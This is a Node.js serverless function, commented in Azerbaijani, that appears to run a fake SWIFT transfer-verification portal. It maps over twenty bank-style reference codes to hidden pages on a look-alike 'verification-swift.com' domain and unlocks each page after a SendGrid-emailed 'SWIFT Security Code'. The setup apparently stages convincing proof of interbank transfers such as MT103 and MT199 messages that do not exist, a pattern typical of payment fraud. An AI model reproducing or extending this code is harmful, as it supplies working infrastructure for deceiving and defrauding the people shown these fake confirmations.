const sgMail = require('@sendgrid/mail');

// 1. DATABASE (Bütün linklər burada gizli qalır)
const refMap = {
    'COBA300525CH59279': 'https://verification-swift.com/verification-cob.html',
    'COBA310625CH68412': 'https://verification-swift.com/verification-cob-abnab',
    'COBA011125CH77290': 'https://verification-swift.com/verification-code-abnaz.html',
    'COBA011125CH86478': 'https://verification-swift.com/verification-abnzdf',
    'COBA780533CH12564': 'https://verification-swift.com/verification-cob-aznasdf',
    'RZBA780533WW25874': 'https://verification-swift.com/verification-cob-xbnetzr',
    'COBA780533CH25879': 'https://verification-swift.com/verification-cob-nzb198adm',
    'COBA310625CH665478': 'https://verification-swift.com/verification-cob-sdf6589db23',
    'COBA515626CH63378': 'https://verification-swift.com/verification-cob-pdg32541ab25',
    'CBA17112248B401-130226': 'https://verification-swift.com/verification-cob-utg566290vcd77',
    'DEU17112212C456-170326': 'https://verification-swift.com/verification-cob-sam54df677',
    'CBA17112248B401-160226': 'https://verification-swift.com/verification-cob-bm65tb7654xz',
    'DEU349827091C679-230326': 'https://verification-swift.com/verification-cob-cju228ac749nb',
    'CBA17112248B401-230226': 'https://verification-swift.com/verfication-cob-an653cbt789g',
    'RCAS29016976S': 'https://verification-swift.com/check/verify/verifymt199/index.html',
    'DEU549325112B147-270326': 'https://verification-swift.com/verification-cob-ds145av41sa17n',
    '2026-03-30-2020A76': 'https://verification-swift.com/check/verify/verifymt199/mt996as7821vba921',
    'EXIMDJACK23032026': 'https://verification-swift.com/check/verify/verifymt199/gh667ai88b09',
    'EXIMDJACK14042026': 'https://verification-swift.com/check/verify/verifymt199/mt552jh770bvc.html',
    'REL-TX-20260424-00': 'https://verification-swift.com/check/verify/verifymt199/dh33487a-bs-006',
    'EXIM/DJ/FIN/28042026-882': 'https://verification-swift.com/check/verify/verifymt199/mt996-as-99902bnd1',
    'UBS21618/234U/MT996': 'https://verification-swift.com/check/verify/verifymt199/ub6689-0-nm211',
    'MMGEU050526ERSTE100M': 'https://verification-swift.com/verification-mt103-bcl01478yt58xd88',
    'DEU17112212C332-230326': 'https://verification-swift.com/verfication-cob-by653atm688v'
};

// Sessiyaları yadda saxla (Hansı emailə hansı kod getdi)
let activeSessions = {}; 

exports.handler = async (event) => {
    // CORS və Method yoxlanışı
    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }

    const { action, ref, email, code } = JSON.parse(event.body);

    // ADDIM 1: Referans yoxla
    if (action === "checkRef") {
        const exists = !!refMap[ref];
        return {
            statusCode: 200,
            body: JSON.stringify({ success: exists })
        };
    }

    // ADDIM 2: Kod yarat və Email Göndər
    if (action === "sendEmail") {
        const generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
        
        // SendGrid Ayarı (Buraya öz API Key-ini yapışdır və ya Netlify ENV istifadə et)
        sgMail.setApiKey(process.env.SENDGRID_API_KEY || 'YOUR_SENDGRID_API_KEY');

        const msg = {
            to: email,
            from: 'verification@yourdomain.com', // Təsdiqlənmiş göndərən emaili
            subject: 'Your SWIFT Security Code',
            text: `Your verification code is: ${generatedCode}`,
            html: `<strong>Your verification code is: ${generatedCode}</strong>`,
        };

        try {
            await sgMail.send(msg);
            activeSessions[email] = { code: generatedCode, ref: ref };
            return {
                statusCode: 200,
                body: JSON.stringify({ success: true })
            };
        } catch (error) {
            return {
                statusCode: 500,
                body: JSON.stringify({ success: false, error: error.message })
            };
        }
    }

    // ADDIM 3: Kodu yoxla və gizli linki ver
    if (action === "verifyFinal") {
        const session = activeSessions[email];
        if (session && session.code === code) {
            const secretUrl = refMap[session.ref];
            delete activeSessions[email]; // Təhlükəsizlik üçün sessiyanı sil
            return {
                statusCode: 200,
                body: JSON.stringify({ success: true, redirect: secretUrl })
            };
        }
        return {
            statusCode: 400,
            body: JSON.stringify({ success: false, message: "Invalid code" })
        };
    }
};
